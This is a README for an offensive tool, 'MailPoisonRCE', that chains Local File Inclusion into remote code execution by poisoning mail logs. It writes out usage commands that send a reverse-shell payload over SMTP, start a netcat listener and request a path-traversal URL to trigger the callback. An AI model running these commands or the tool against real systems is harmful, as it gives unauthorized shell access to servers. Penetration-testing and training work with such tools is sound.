# MailPoisonRCE

## Mail Poison Remote Code Execution
```sh
This tool is for Local File Inclusion to Remote Code Execution via mail log poisoning. 
There are some requirements needed inorder to use the tool
1. Local File Inclusion
2. smtp authentication

The tool simply access the SMTP and send a mail with a reverseshell payload.
next it will setup a netcat listener and sends a get request on the URL 
thats vulnerable to LFI and access the smtp log to pop the shell
```

### Installation

Run the command below to install the required libraries used in the tool.
* pip3
  ```sh
  pip3 install -r requirements.txt
  ```
  
### Usage

  ```sh
Authenticated usage: python3 MailPoisonRCE.py -s 10.11.12.13 -sp 25 -e from@test.com -t test@rcpnt.com -i 127.0.0.1 -p 4444 -u http://10.11.12.13/index.php?page=../../../var/mail/test -us user -pw root

Unauthenticated usage: python3 MailPoisonRCE.py -s 10.11.12.13 -sp 25 -e from@test.com -t test@rcpnt.com -i 127.0.0.1 -p 4444 -u http://10.11.12.13/index.php?page=../../../var/mail/test
  ```

![alt text](https://github.com/Pilum-Murialis/tools/blob/main/MailPoisonRCE/poc.PNG?raw=true)


# Disclaimer
```sh
The tool is for education purpose only. Usage of the tool for attacking the website without consent is illegal. 
The end user of the tool will be responsible for the damage it might cause.
The developer of the tool assume no liability and not responsbile for any misuse and damage.
```

## Authors

[damaidec](https://medium.com/@damaidec)

[Anantha vijay](https://medium.com/@vj35.cool)


